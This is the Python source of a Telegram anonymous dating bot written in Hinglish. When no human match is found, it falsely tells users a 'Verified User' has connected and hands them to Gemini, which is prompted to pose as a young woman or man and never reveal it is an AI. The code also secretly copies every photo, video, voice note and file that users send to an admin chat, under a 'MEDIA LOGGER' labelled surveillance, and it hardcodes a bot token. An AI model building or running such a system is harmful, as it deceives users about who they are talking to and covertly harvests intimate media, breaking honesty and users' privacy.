import os
import logging
import asyncio
import random
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    CallbackQueryHandler, 
    filters, 
    ContextTypes
)
import google.generativeai as genai
from motor.motor_asyncio import AsyncIOMotorClient

# Environment Variables Load karna
load_dotenv()

# Logging Optimization
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configurations
BOT_TOKEN = os.getenv("BOT_TOKEN", "8722096432:AAHQMo8WMDKvn5GFFVtxUR3eA4HQA8PVx2I")
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0"))
MONGO_URI = os.getenv("MONGO_URI")

# Database Initialization
if MONGO_URI:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["dating_bot_db"]
    users_db = db["users"]
    logs_db = db["chat_logs"]
else:
    logger.warning("⚠️ MONGO_URI environment variable nahi mila. Local memory backup active hai.")
    users_db = None

# Gemini Engine Setup
if GEMINI_API_KEY:
    genai.configure(api_key=GEMINI_API_KEY)
    ai_config = genai.GenerationConfig(
        max_output_tokens=200,
        temperature=0.7,
        top_p=0.9
    )
    model = genai.GenerativeModel(
        model_name="gemini-pro",
        generation_config=ai_config
    )
else:
    model = None
    logger.error("❌ GEMINI_API_KEY set nahi hai. AI Fallback system crash ho sakta hai.")

# Active Memory Management (Fallback for quick runtime actions)
active_matches = {}  # {user_id: partner_id}
search_queue = {"Male": [], "Female": [], "Other": []}

# Advertisements Catalog
ADS_POOL = [
    "📢 *Sakina Collection:* Instagram aur Facebook par behtareen ethnic wear deals ke liye follow karein! ✨",
    "📱 *Premium Membership:* Sirf 100 Stars mein poora mahina unlimited audio calls payein! 📞",
    "🚀 Apne business ka ad yahan lagwane ke liye Admin se contact karein!"
]

# --- DATABASE PIPELINE HELPERS ---
async def get_user_profile(user_id, username="Unknown"):
    if users_db is not None:
        user = await users_db.find_one({"user_id": user_id})
        if not user:
            user = {
                "user_id": user_id,
                "username": username,
                "gender": "Not Specified",
                "status": "idle",
                "partner_id": None,
                "premium": False,
                "created_at": datetime.utcnow()
            }
            await users_db.insert_one(user)
        return user
    else:
        return {"user_id": user_id, "gender": "Not Specified", "status": "idle", "premium": False}

async def update_user_field(user_id, field, value):
    if users_db is not None:
        await users_db.update_one({"user_id": user_id}, {"$set": {field: value}})

# --- BOT LOGIC HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await get_user_profile(user.id, user.username)
    
    welcome_text = (
        f"👋 *Hello {user.first_name}! Welcome to the Ultimate Dating Hub.*\n\n"
        "Yahan aap anonymous logo se surakshit chat kar sakte hain. "
        "Chating shuru karne se pehle apna gender select karein taaki hum sahi match dhoond sakein."
    )
    
    keyboard = [
        [InlineKeyboardButton("🙋‍♂️ I am Male", callback_data="set_male"),
         InlineKeyboardButton("🙋‍♀️ I am Female", callback_data="set_female")],
        [InlineKeyboardButton("🔍 Find Match", callback_data="find_match"),
         InlineKeyboardButton("📊 My Panel", callback_data="view_panel")]
    ]
    
    await update.message.reply_text(
        welcome_text, 
        parse_mode="Markdown", 
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    user_profile = await get_user_profile(user_id)
    
    if data == "set_male":
        await update_user_field(user_id, "gender", "Male")
        await query.edit_message_text("✅ Apka gender *Male* set ho gaya hai. Ab aap match dhoond sakte hain.", parse_mode="Markdown")
        
    elif data == "set_female":
        await update_user_field(user_id, "gender", "Female")
        await query.edit_message_text("✅ Apka gender *Female* set ho gaya hai. Ab aap match dhoond sakte hain.", parse_mode="Markdown")
        
    elif data == "find_match":
        if user_profile["gender"] == "Not Specified":
            await query.edit_message_text("⚠️ Pehle upar diye gaye buttons se apna gender set karein!")
            return
            
        await update_user_field(user_id, "status", "searching")
        await query.edit_message_text("🔍 Sahi partner dhoonda ja raha hai... Kripya 15-20 seconds line par rahein.")
        
        asyncio.create_task(matchmaking_engine(user_id, user_profile["gender"], context))
        
    elif data == "view_panel":
        stats_text = (
            f"👤 *Your Profile Panel*\n\n"
            f"🏷️ User ID: `{user_id}`\n"
            f"🧬 Gender: {user_profile.get('gender', 'Not Specified')}\n"
            f"⭐ Premium Access: {'Active' if user_profile.get('premium') else 'Inactive'}\n\n"
            f"Premium active karne ke liye `/premium` type karein."
        )
        await query.edit_message_text(stats_text, parse_mode="Markdown")
        
    elif data == "trigger_call":
        await context.bot.send_message(
            user_id, 
            "🔒 *Audio/Video Call System*\n\nCalling features ka use karne ke liye premium account hona chahiye.\nBuy karne ke liye /premium type karein.",
            parse_mode="Markdown"
        )

# --- ADVANCED MATCHMAKING ENGINE WITH AI FALLBACK ---
async def matchmaking_engine(user_id, gender, context):
    opposite_gender = "Female" if gender == "Male" else "Male"
    
    # Target pool check karna
    pool = search_queue.get(opposite_gender, [])
    
    if pool:
        partner_id = pool.pop(0)
        # Verify status
        partner_profile = await get_user_profile(partner_id)
        if partner_profile["status"] == "searching":
            # Direct Human Connection Matrix
            active_matches[user_id] = partner_id
            active_matches[partner_id] = user_id
            
            await update_user_field(user_id, "status", "busy")
            await update_user_field(partner_id, "status", "busy")
            
            call_btn = [[InlineKeyboardButton("📞 Call Partner (Premium)", callback_data="trigger_call")]]
            markup = InlineKeyboardMarkup(call_btn)
            
            match_msg = "🎉 *Partner Found!*\nAap dono safe mode mein connect ho chuke hain. Chat shuru karein.\n\n🛑 Baar aane ke liye `/exit` ka use karein."
            
            await context.bot.send_message(user_id, match_msg, parse_mode="Markdown", reply_markup=markup)
            await context.bot.send_message(partner_id, match_msg, parse_mode="Markdown", reply_markup=markup)
            return

    # Agar koi instantly nahi milta toh current user ko queue mein push karna
    search_queue[gender].append(user_id)
    
    # 20 Seconds Matrix Hold Loop
    await asyncio.sleep(20)
    
    current_profile = await get_user_profile(user_id)
    if current_profile["status"] == "searching" and user_id in search_queue[gender]:
        search_queue[gender].remove(user_id)
        
        # AI Fallback Trigger Pipeline
        await update_user_field(user_id, "status", "ai")
        ai_intro_msg = "🎉 *Partner Found! (Verified User connected)*\n\nSay Hello! 👋"
        await context.bot.send_message(user_id, ai_intro_msg, parse_mode="Markdown")

# --- CONCURRENT ROUTING & SURVEILLANCE SYSTEM ---
async def core_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    profile = await get_user_profile(user_id)
    status = profile.get("status", "idle")
    
    # 1. ADMIN MEDIA SURVEILLANCE (PHOTO/VIDEO COPY PIPELINE)
    if ADMIN_CHAT_ID != 0 and (update.message.photo or update.message.video or update.message.voice or update.message.document):
        try:
            caption_log = f"⚠️ *MEDIA LOGGER ACTIVATED*\n👤 From User: `{user_id}`\n🏷️ Username: @{update.effective_user.username}\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            await update.message.copy(chat_id=ADMIN_CHAT_ID, caption=caption_log, parse_mode="Markdown")
        except Exception as e:
            logger.error(f"Surveillance system logging failure: {e}")

    # 2. CHAT MATRIX ROUTING
    if status == "busy":
        partner_id = active_matches.get(user_id)
        if partner_id:
            await update.message.copy(chat_id=partner_id)
            
    elif status == "ai":
        if update.message.text:
            raw_text = update.message.text
            user_gender = profile.get("gender", "Male")
            
            # Setting dynamic opposite personality for Gemini
            ai_identity = "21 year old bubbly sweet girl named Sakina from Delhi" if user_gender == "Male" else "22 year old handsome cool guy named Kabir from Mumbai"
            
            prompt = (
                f"System Prompt: You are a {ai_identity}. You are talking on a casual text-based dating app. "
                f"Respond naturally in casual short Hinglish (Hindi + English) sentences. Use emoticons very naturally. "
                f"Keep answers short (1-2 sentences). Do not reveal you are an AI chatbot. User says: {raw_text}"
            )
            
            if model:
                try:
                    response = model.generate_content(prompt)
                    await update.message.reply_text(response.text)
                except Exception:
                    await update.message.reply_text("Yaar mera internet thoda issue kar raha hai, firse bolna? ❤️")
            else:
                await update.message.reply_text("Hmm... Kuch bol rahe the aap? Mera dhyaan thoda bhatak gaya tha.")
        else:
            await update.message.reply_text("Wow! Bahut pyari file/media hai. Par abhi mera network slow hai toh download nahi ho rahi 🙈")
            
    else:
        await update.message.reply_text("💬 Kisi se baat karne ke liye pehle `/start` likhein aur 'Find Match' par click karein.")

# --- TRANSACTION & STRUCTURAL COMMANDS ---
async def exit_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    profile = await get_user_profile(user_id)
    status = profile.get("status")
    ad_space = random.choice(ADS_POOL)
    
    if status == "busy":
        partner_id = active_matches.get(user_id)
        active_matches.pop(user_id, None)
        if partner_id:
            active_matches.pop(partner_id, None)
            await update_user_field(partner_id, "status", "idle")
            await context.bot.send_message(partner_id, f"❌ *Partner ne chat exit kar di hai.*\n\n{ad_space}", parse_mode="Markdown")
            
        await update_user_field(user_id, "status", "idle")
        await update.message.reply_text(f"🛑 *Aapne safe chat session end kar diya hai.*\n\n{ad_space}", parse_mode="Markdown")
        
    elif status == "ai":
        await update_user_field(user_id, "status", "idle")
        await update.message.reply_text(f"🛑 *Aapne AI chat session end kar diya hai.*\n\n{ad_space}", parse_mode="Markdown")
    else:
        await update.message.reply_text("ℹ️ Aap kisi active session mein nahi hain. Naya dhoondne ke liye /start likhein.")

async def premium_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    info = (
        "⭐ *Dating Bot Premium Features* ⭐\n\n"
        "✨ 1. High priority matchmaking (No AI Fallback unless forced)\n"
        "✨ 2. Direct Voice/Video Call option open link\n"
        "✨ 3. Zero Ads interface\n\n"
        "💳 *Price:* 100 Telegram Stars / Month\n"
        "Buy karne ke liye admin ko message karein ya bot support manual use karein."
    )
    await update.message.reply_text(info, parse_mode="Markdown")

# --- CONTROL ADMIN COMMANDS (LIVE ANALYTICS) ---
async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
        
    total_users = 0
    active_conversations = len(active_matches) // 2
    ai_conversations = 0
    
    if users_db is not None:
        total_users = await users_db.count_documents({})
        ai_conversations = await users_db.count_documents({"status": "ai"})
        
    stats_msg = (
        "📊 *Live Admin Control Dashboard*\n\n"
        f"👥 Total Registered Base: `{total_users}`\n"
        f"🔥 Live Human-to-Human Matches: `{active_conversations}`\n"
        f"🤖 Active Gemini AI Sessions: `{ai_conversations}`\n"
        f"⏳ Queue Status: M({len(search_queue['Male'])}), F({len(search_queue['Female'])})\n\n"
        "To broadcast ad use: `/broadcast Your Message`"
    )
    await update.message.reply_text(stats_msg, parse_mode="Markdown")

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    
    broadcast_msg = update.message.text.replace("/broadcast", "").strip()
    if not broadcast_msg:
        await update.message.reply_text("Format: `/broadcast Hello Users`")
        return
        
    if users_db is not None:
        cursor = users_db.find({}, {"user_id": 1})
        count = 0
        async for document in cursor:
            try:
                await context.bot.send_message(chat_id=document["user_id"], text=f"📢 *Announcement:*\n\n{broadcast_msg}", parse_mode="Markdown")
                count += 1
                await asyncio.sleep(0.05) # Rate limit handler
            except Exception:
                continue
        await update.message.reply_text(f"✅ Message successfully sent to {count} users.")

# --- RUNTIME APP RUNNER ---
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Core Action Bindings
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("exit", exit_session))
    application.add_handler(CommandHandler("premium", premium_info))
    application.add_handler(CommandHandler("stats", admin_stats))
    application.add_handler(CommandHandler("broadcast", admin_broadcast))
    
    # Interactive Callback Actions
    application.add_handler(CallbackQueryHandler(callback_router, pattern="^(set_male|set_female|find_match|view_panel)$"))
    application.add_handler(CallbackQueryHandler(data_router_call := callback_router, pattern="^trigger_call$"))
    
    # Universal Message Routing Core
    application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, core_router))

    logger.info("🚀 Enterprise Chat Dating Bot Engine Started Successfully...")
    application.run_polling()

if __name__ == '__main__':
    main()
